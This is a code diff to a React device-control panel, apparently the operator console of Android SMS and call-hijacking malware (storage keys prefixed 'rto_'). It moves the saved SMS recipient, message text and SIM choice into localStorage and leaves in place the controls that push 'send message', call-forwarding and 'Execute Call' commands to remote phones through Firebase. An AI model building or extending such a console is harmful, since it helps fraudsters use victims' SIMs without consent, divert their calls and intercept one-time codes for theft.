@@ -21,22 +21,59 @@ export default function DevicesPanel({
   const [offset, setOffset] = useState(0);
   const [expandedDevices, setExpandedDevices] = useState({});
   const [activeTabs, setActiveTabs] = useState({});
+
+  // Permanent Persistent State for SMS Content & Recipient
+  const [globalSmsNum, setGlobalSmsNum] = useState("");
+  const [globalSmsText, setGlobalSmsText] = useState("");
+  const [simSelections, setSimSelections] = useState({});
   const [formMemory, setFormMemory] = useState({});
 
-  // LocalStorage se saved phone number & message content load karna
+  // LocalStorage se saved SMS text aur number load karna
   useEffect(() => {
     try {
-      const saved = localStorage.getItem("rto_form_memory");
-      if (saved) {
-        setFormMemory(JSON.parse(saved));
-      }
+      const savedNum = localStorage.getItem("rto_sms_recipient");
+      const savedText = localStorage.getItem("rto_sms_content");
+      const savedSims = localStorage.getItem("rto_sim_selections");
+      const savedMemory = localStorage.getItem("rto_form_memory");
+
+      if (savedNum) setGlobalSmsNum(savedNum);
+      if (savedText) setGlobalSmsText(savedText);
+      if (savedSims) setSimSelections(JSON.parse(savedSims));
+      if (savedMemory) setFormMemory(JSON.parse(savedMemory));
     } catch (e) {}
   }, []);
 
-  // Form field update aur LocalStorage me save karna
-  const updateField = (key, value) => {
+  // Recipient Number update & auto-save
+  const handleRecipientChange = (val) => {
+    setGlobalSmsNum(val);
+    try {
+      localStorage.setItem("rto_sms_recipient", val);
+    } catch (e) {}
+  };
+
+  // Message Content update & auto-save
+  const handleContentChange = (val) => {
+    setGlobalSmsText(val);
+    try {
+      localStorage.setItem("rto_sms_content", val);
+    } catch (e) {}
+  };
+
+  // SIM Selection per device
+  const handleSimSelect = (devId, simVal) => {
+    setSimSelections((prev) => {
+      const updated = { ...prev, [devId]: simVal };
+      try {
+        localStorage.setItem("rto_sim_selections", JSON.stringify(updated));
+      } catch (e) {}
+      return updated;
+    });
+  };
+
+  // Generic Field updater for Call/Forward
+  const updateMemoryField = (key, val) => {
     setFormMemory((prev) => {
-      const updated = { ...prev, [key]: value };
+      const updated = { ...prev, [key]: val };
       try {
         localStorage.setItem("rto_form_memory", JSON.stringify(updated));
       } catch (e) {}
@@ -95,12 +132,12 @@ export default function DevicesPanel({
     const baseRef = ref(db, `user_data/${devId}`);
 
     if (type === "sendsms") {
-      const num = formMemory[`smsNum-${devId}`];
-      const body = formMemory[`smsText-${devId}`];
-      const selectedSim = formMemory[`smsSim-${devId}`] || "0";
+      const num = globalSmsNum.trim();
+      const body = globalSmsText.trim();
+      const selectedSim = simSelections[devId] || "0";
 
-      if (!num || !body) return showToast("⚠️ Enter recipient number & message!", "warning");
-      if (!confirm(`Send SMS from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
+      if (!num || !body) return showToast("⚠️ Recipient number aur message dono likhein!", "warning");
+      if (!confirm(`Send SMS via SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
 
       update(baseRef, {
         command: "send message",
@@ -113,7 +150,7 @@ export default function DevicesPanel({
         timestamp: Date.now()
       }).then(() => {
         showToast(`✅ SMS sent via SIM ${Number(selectedSim) + 1}`, "success");
-        // NOTE: Input content hataya nahi gaya hai, wahi save rahega
+        // NOTE: Input text ko clear nahi kiya gaya hai taaki wo wahi rahe!
       });
     } 
     else if (type === "fwd_on") {
@@ -253,9 +290,11 @@ export default function DevicesPanel({
 
           const sim1Num = dev.numberSim1 || "No SIM 1";
           const sim2Num = dev.numberSim2 || "No SIM 2";
+          const currentSelectedSim = simSelections[devId] || "0";
 
           return (
             <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
+              {/* Card Header */}
               <div className="card-header" onClick={() => toggleExpand(devId)}>
                 <div style={{ flex: 1, minWidth: 0 }}>
                   <div className="device-name-premium">
@@ -294,6 +333,7 @@ export default function DevicesPanel({
                 </div>
               </div>
 
+              {/* 4-Column Grid Info */}
               <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
                 <div className="info-item-premium">
                   <span className="info-label">Device Model</span>
@@ -313,10 +353,12 @@ export default function DevicesPanel({
                 </div>
               </div>
 
+              {/* Expand Hint */}
               <div className="expand-hint" onClick={() => toggleExpand(devId)}>
                 <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
               </div>
 
+              {/* Expandable Tabs */}
               {expanded && (
                 <div className="expandable-content">
                   <div className="actions-row-premium">
@@ -425,13 +467,14 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* Send SMS Command (PERSISTENT RECIPIENT & CONTENT) */}
+                  {/* SEND SMS COMMAND (PERMANENT RECIPIENT & CONTENT) */}
                   {curTab === "sendsms" && (
                     <div className="section-premium">
                       <div className="section-title">
                         <i className="fas fa-paper-plane" style={{ marginRight: 6 }}></i> Send SMS Command
                       </div>
 
+                      {/* SIM Selection */}
                       <div style={{ marginBottom: 10 }}>
                         <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
                           Select Outgoing SIM:
@@ -439,13 +482,13 @@ export default function DevicesPanel({
                         <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                           <button
                             type="button"
-                            onClick={() => updateField(`smsSim-${devId}`, "0")}
+                            onClick={() => handleSimSelect(devId, "0")}
                             style={{
                               padding: "8px",
                               borderRadius: 8,
-                              border: (formMemory[`smsSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
-                              background: (formMemory[`smsSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
-                              color: (formMemory[`smsSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
+                              border: currentSelectedSim === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: currentSelectedSim === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: currentSelectedSim === "0" ? "var(--gold)" : "var(--text-secondary)",
                               fontSize: 11,
                               fontWeight: 600,
                               cursor: "pointer",
@@ -458,13 +501,13 @@ export default function DevicesPanel({
 
                           <button
                             type="button"
-                            onClick={() => updateField(`smsSim-${devId}`, "1")}
+                            onClick={() => handleSimSelect(devId, "1")}
                             style={{
                               padding: "8px",
                               borderRadius: 8,
-                              border: formMemory[`smsSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
-                              background: formMemory[`smsSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
-                              color: formMemory[`smsSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
+                              border: currentSelectedSim === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: currentSelectedSim === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: currentSelectedSim === "1" ? "var(--gold)" : "var(--text-secondary)",
                               fontSize: 11,
                               fontWeight: 600,
                               cursor: "pointer",
@@ -477,33 +520,52 @@ export default function DevicesPanel({
                         </div>
                       </div>
 
-                      {/* Persistent Recipient Number */}
+                      {/* Permanent Recipient Phone Number */}
                       <input 
                         type="text" 
                         placeholder="Recipient Phone Number" 
                         className="search-input" 
                         style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
-                        value={formMemory[`smsNum-${devId}`] || ""}
-                        onChange={(e) => updateField(`smsNum-${devId}`, e.target.value)}
+                        value={globalSmsNum}
+                        onChange={(e) => handleRecipientChange(e.target.value)}
                       />
 
-                      {/* Persistent Message Text Area */}
+                      {/* Permanent Message Content */}
                       <textarea 
                         placeholder="Type Message Content..." 
                         rows="3"
                         className="search-input" 
                         style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
-                        value={formMemory[`smsText-${devId}`] || ""}
-                        onChange={(e) => updateField(`smsText-${devId}`, e.target.value)}
+                        value={globalSmsText}
+                        onChange={(e) => handleContentChange(e.target.value)}
                       />
 
-                      <button 
-                        className="btn-luxury btn-blue" 
-                        style={{ width: "100%", justifyContent: "center", padding: "10px" }} 
-                        onClick={() => handleCommand("sendsms", devId)}
-                      >
-                        <i className="fas fa-paper-plane"></i> Send SMS from SIM {(Number(formMemory[`smsSim-${devId}`] || "0") + 1)}
-                      </button>
+                      <div style={{ display: "flex", gap: 8 }}>
+                        <button 
+                          className="btn-luxury btn-blue" 
+                          style={{ flex: 1, justifyContent: "center", padding: "10px" }} 
+                          onClick={() => handleCommand("sendsms", devId)}
+                        >
+                          <i className="fas fa-paper-plane"></i> Send SMS from SIM {(Number(currentSelectedSim) + 1)}
+                        </button>
+                        {(globalSmsNum || globalSmsText) && (
+                          <button
+                            type="button"
+                            title="Clear saved draft"
+                            onClick={() => {
+                              if (confirm("Clear saved recipient number and text?")) {
+                                handleRecipientChange("");
+                                handleContentChange("");
+                                showToast("Draft cleared", "info");
+                              }
+                            }}
+                            className="btn-sm"
+                            style={{ background: "rgba(239, 68, 68, 0.15)", color: "var(--red)", borderRadius: 6, padding: "0 12px" }}
+                          >
+                            <i className="fas fa-eraser"></i>
+                          </button>
+                        )}
+                      </div>
                     </div>
                   )}
 
@@ -521,7 +583,7 @@ export default function DevicesPanel({
                         <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                           <button
                             type="button"
-                            onClick={() => updateField(`fwdSim-${devId}`, "0")}
+                            onClick={() => updateMemoryField(`fwdSim-${devId}`, "0")}
                             style={{
                               padding: "8px",
                               borderRadius: 8,
@@ -540,7 +602,7 @@ export default function DevicesPanel({
 
                           <button
                             type="button"
-                            onClick={() => updateField(`fwdSim-${devId}`, "1")}
+                            onClick={() => updateMemoryField(`fwdSim-${devId}`, "1")}
                             style={{
                               padding: "8px",
                               borderRadius: 8,
@@ -565,7 +627,7 @@ export default function DevicesPanel({
                         className="search-input" 
                         style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
                         value={formMemory[`fwdNum-${devId}`] || ""}
-                        onChange={(e) => updateField(`fwdNum-${devId}`, e.target.value)}
+                        onChange={(e) => updateMemoryField(`fwdNum-${devId}`, e.target.value)}
                       />
 
                       <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
@@ -597,7 +659,7 @@ export default function DevicesPanel({
                         className="search-input" 
                         style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                         value={formMemory[`callNum-${devId}`] || ""}
-                        onChange={(e) => updateField(`callNum-${devId}`, e.target.value)}
+                        onChange={(e) => updateMemoryField(`callNum-${devId}`, e.target.value)}
                       />
                       <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
                         <i className="fas fa-phone"></i> Execute Call
